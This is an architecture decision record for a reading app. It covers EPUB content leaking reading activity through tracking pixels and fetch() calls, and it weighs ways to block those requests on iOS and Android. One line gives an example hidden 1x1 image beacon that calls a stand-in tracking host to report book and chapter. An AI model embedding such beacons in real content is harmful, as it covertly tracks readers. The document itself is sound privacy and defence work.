---
status: proposed
date: 2026-08-30
deciders:
---

# ADR-0015 — A publication's own network access: deny it, admit it, or narrow it

## Context and problem statement

[`README.md`](../../README.md) makes a headline promise — "no telemetry of any
kind. Data leaves your device only to the servers you configured yourself" —
and [`AGENTS.md`](../../AGENTS.md) makes it a non-negotiable. The reflowable
EPUB reader breaks it, without the reader touching anything.

An EPUB is HTML, and StoryArc renders it in a real web view on both platforms
([ADR-0001](0001-independent-native-cores.md) grants that one exception, and
[ADR-0005](0005-format-and-rendering-libraries.md) puts Readium behind it).
Neither app narrows what that web view may fetch. A chapter containing

```html
<img src="https://track.example/p.png?b=9f2&c=4" width="1" height="1">
```

issues the request on first render. The host learns the device's IP, the moment
of reading, and — through a URL the publication's author chose — which book and
which chapter. Reopening the book on later evenings builds a reading timeline
keyed to that address. Publication JavaScript does it more precisely, with
`fetch()` on every page turn, and Readium enables scripting on both platforms.

This is the security review's **rank 3, high, CONFIRMED**. It is filed as
*needs a decision* rather than *fix it* because every remedy changes what
publications render, what the toolkit can do, or what the project promises — and
because the honest answer is not obvious. This ADR establishes what is actually
reachable in Readium 3.x on each platform, and recommends. It does not decide.

## Decision drivers

- The promise in `README.md` is a headline, not a footnote. A privacy claim that
  is false for the one format that can reach the network is the kind of claim
  that costs more than it buys.
- Some EPUBs legitimately reference remote resources — remote audio and video
  are allowed by EPUB 3, and a few publishers host fonts and images externally.
  Denying by default makes those render incompletely.
- StoryArc has no backend and no way to tell a tracking pixel from a cover
  image. Any allow-list is a guess about intent.
- Whatever is chosen must be true on **both** platforms, or the difference has
  to be stated as plainly as the promise is.

## What Readium 3.x actually offers

Established by reading the resolved dependencies, not from documentation.

### iOS — swift-toolkit 3.11.0

| Lever | Reachable? | Evidence |
| --- | --- | --- |
| A content rule list on the publication's web view | **Yes** | `EPUBNavigatorDelegate.navigator(_:setupUserScripts:)` hands the app the live `WKUserContentController` of each spread view (`Sources/Navigator/EPUB/EPUBNavigatorViewController.swift:19` and `:1264-1265`). `WKUserContentController.add(_ contentRuleList:)` is the supported way to install a compiled `WKContentRuleList`, so a rule that blocks every load whose URL is not the `readium` scheme can be installed with no change to the toolkit. The app already sets a delegate — `EpubReaderOpening.swift` assigns `NavigatorObserver`. |
| Turning publication JavaScript off | **No, and it would not be wanted** | `WKWebViewConfiguration` is built privately inside `EPUBSpreadView.swift:74` and `WKWebView.configuration` returns a copy, so `defaultWebpagePreferences.allowsContentJavaScript` is unreachable. It is also the wrong lever: Readium drives pagination, locators, decorations and selection through injected `WKUserScript`s, and disabling content scripting disables those with it. |
| Refusing subresource loads through the navigation delegate | **No** | `EPUBSpreadView.swift:651-666` starts from `var policy: WKNavigationActionPolicy = .allow` and cancels only `navigationType == .linkActivated`. `decidePolicyFor` is not called for subresource loads at all — images, CSS, fonts and `fetch()` never reach it. |

### Android — readium-navigator 3.3.0

| Lever | Reachable? | Evidence |
| --- | --- | --- |
| A navigator-level interception hook | **No** | `EpubNavigatorFragment.Configuration` exposes `servedAssets`, `readiumCssRsProperties`, `useReadiumCssFontSize`, `decorationTemplates`, `disablePageTurnsWhileScrolling`, `selectionActionModeCallback`, `shouldApplyInsetsPadding`, `disableSelectionWhenProtected`, font declarations and JavaScript interfaces. There is no request filter among them. `WebViewServer.shouldInterceptRequest` is public but is called by `R2BasicWebView.shouldInterceptRequest$readium_navigator`, which is `internal`. |
| Reaching the WebView and blocking network loads | **Yes, but through Readium's internals** | `R2BasicWebView extends android.webkit.WebView` and `R2EpubPageFragment.getWebView()` is public, so `webView.settings.blockNetworkLoads = true` is one line — *if* the app can get hold of each page fragment. That means a `FragmentManager.FragmentLifecycleCallbacks` on the navigator's child fragment manager, keyed on a class the toolkit does not promise to keep. It works; it is not a contract. |
| Injecting a CSP into each served resource | **Yes, and it is platform-neutral** | The publication is opened by the app (`PublicationOpener` on both platforms) before the navigator ever sees it. Wrapping the container so every XHTML resource gains `<meta http-equiv="Content-Security-Policy" content="default-src 'self' data:; connect-src 'none'">` is entirely inside the app's own code and needs no toolkit hook on either platform. It costs an HTML rewrite per resource and it is only as good as the web view's CSP implementation, which on Android is the system WebView's — a component whose version varies by device. |

Two further facts that bear on the size of the problem:

- **Android has one origin for every book.** `WebViewServer.PACKAGE_HOSTNAME` is
  the fixed `https://readium_package/`, so a cookie set by one publication is not
  scoped to that publication: it is an identifier across everything the reader
  opens. iOS serves each publication from a fresh `readium://<UUID>/` and does
  not have this. (Rank 19 is the other half of that story; "Clear cache" now
  removes web-view cookies and origin storage on both platforms, which limits the
  lifetime of such an identifier but does not stop it being set.)
- **Android permits cleartext app-wide.** Fixed under rank 10; the beacon no
  longer works over plain `http://`. It still works over `https://`.

## Considered options

### A — Deny by default, with an opt-in Privacy setting

Block every load that is not the publication's own scheme. iOS through a
`WKContentRuleList` installed in `setupUserScripts`; Android through a CSP
injected into each served resource, with `blockNetworkLoads` as a belt-and-braces
second line if the fragment hook proves stable. A single Privacy-screen toggle,
**off by default**, lifts it for readers who want remote content, and says in one
sentence what turning it on means.

- **Good.** The promise in `README.md` becomes true. The default costs the reader
  nothing they asked for.
- **Good.** The setting is the only honest place to put "some books will look
  wrong" — and `settings-and-about` already asks for privacy to be "verifiable
  rather than merely stated", which a switch with a visible consequence is.
- **Bad.** Two mechanisms, one per platform, both needing device verification; a
  content rule list is compiled asynchronously and has to be ready before the
  first spread renders, or the first chapter escapes.
- **Bad.** A new setting is a new string in four languages on both platforms, and
  a new spec scenario in `settings-and-about`.
- **Bad.** A publication with a legitimate remote image renders with a hole in it
  and no explanation, unless a "this book wanted to load something" notice is
  built too — which is more UI than the toggle.

### B — Amend `SECURITY.md` and say egress is out of scope

Leave the behaviour. Add network egress from publication content to the
"explicitly out of scope" list, and soften the `README.md` promise so it is about
StoryArc's own traffic rather than everything the device sends while StoryArc is
open.

- **Good.** Costs nothing to build and nothing to maintain, and every claim the
  project makes becomes true the moment it lands.
- **Bad.** It is a retreat from a headline promise, in a reader app whose entire
  pitch is that it does not phone home. "Your books might" is a materially
  different product.
- **Bad.** It contradicts non-negotiable 2 in `AGENTS.md` as written, so the
  non-negotiable would have to be amended too.

### C — Deny by default, no setting

Option A without the escape hatch.

- **Good.** Simplest to build and to explain; nothing to translate; no spec
  change beyond a sentence in `SECURITY.md`.
- **Bad.** A publication that legitimately needs a remote resource is simply
  broken, with no way for the reader to say otherwise — and no way for us to know
  how often that happens, because the app collects nothing.

### D — Allow-list by origin, prompted on first request

Block by default and ask the reader per host, the way a browser asks for a
camera.

- **Bad.** A reader cannot tell `cdn.publisher.example` from
  `cdn.publisher-analytics.example`, so the prompt delegates a judgement nobody
  can make. It is also a modal interruption in the middle of a page turn, which
  is precisely what "the artwork is the interface" rules out.
- Recorded so it is not re-proposed.

## Recommendation, not a decision

**Option A**, with two qualifications the decider should weigh:

1. **Ship the deny first, the setting second.** The block is the part that makes
   the promise true; the toggle is the part that makes it kind. If only one lands
   in a release, it should be the block — Option C is a legitimate intermediate
   state, and it is reversible.
2. **Verify on device before claiming it.** A content rule list and a CSP are
   both assertions about a web engine's behaviour, and this ADR establishes only
   that the hooks exist. Neither claim should reach `SECURITY.md` until a crafted
   EPUB with a beacon has been opened on a real iPhone and a real Android device
   and the request has been observed *not* to leave. The corpus has no such
   fixture today; `packages/test-fixtures` is where it belongs.

Whatever is chosen, the `SECURITY.md` row for reflowable EPUB content has to say
what "restricted context" restricts. It has been amended in the same change as
this ADR to name egress as an open question and point here, because the previous
wording read as though the question had been answered.

## Consequences

- Until this is decided, **the privacy claim in `README.md` is false for EPUB**,
  and the security review's rank 3 stays open. Nothing else in the audit is
  blocked on it.
- Rank 19's fix (clearing web-view cookies and origin storage) was made
  regardless, because it is correct under every option here: under A and C there
  is nothing left to clear, and under B it is the only thing standing between a
  publication and a permanent identifier.
- If A or C is chosen, `docs/openspec/specs/` needs the behaviour written down
  first — `settings-and-about` for the toggle, and a sentence in the EPUB reading
  capability for the block. Nothing here has been built.
